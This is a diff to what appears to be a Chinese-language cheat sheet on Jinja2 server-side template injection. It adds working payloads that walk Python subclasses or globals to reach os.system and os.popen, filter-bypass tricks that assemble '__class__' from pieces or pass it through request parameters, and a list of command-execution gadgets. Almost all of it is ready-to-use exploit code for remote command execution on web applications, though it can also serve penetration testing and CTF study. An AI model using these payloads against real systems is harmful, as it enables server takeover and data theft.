@@ -32,10 +32,14 @@ or
 
 善用迴圈的版本(不需要手動找)
 {% for x in ().__class__.__base__.__subclasses__() %}
-{% if "warning" in x.__name__ %}
-{{x()._module.__builtins__['__import__']('os').system("ls")}}
+{% if 'warning' in x.__name__ %}
+{{x()._module.__builtins__['__import__']('os').system('ls')}}
 {% endif %}
 {% endfor %}
+
+其他 payload:
+ -> lipsum.__globals__.os.popen('ls').read()
+ -> request['application']['__globals__']['__builtins__']['__import__']('os')['system']
 ```
 
 ## Bypass
@@ -43,8 +47,18 @@ or
 ```
 1. ''['__class__'] 取代 ''.__class__
 2. filter  {{ ''|attr(['_'*2,'class','_'*2]|join) }}
-如果要用[]要分段寫 {% set a = ''|attr(['_'*2,'class','_'*2]|join) %} {% a[1] %}
+如果要用[]要分段寫 {% set a = ''|attr(['_'*2,'class','_'*2]|join)|string %}{{ a[1] }}
+3. request.args[0|string] 取代 '__class__'
+?0=__class__
 ```
 
+## Gadget
 
+```
+有回顯
+os.popen('ls').read()
+subprocess.check_output('ls',shell=true)
 
+無回顯
+os.system('ls')
+```
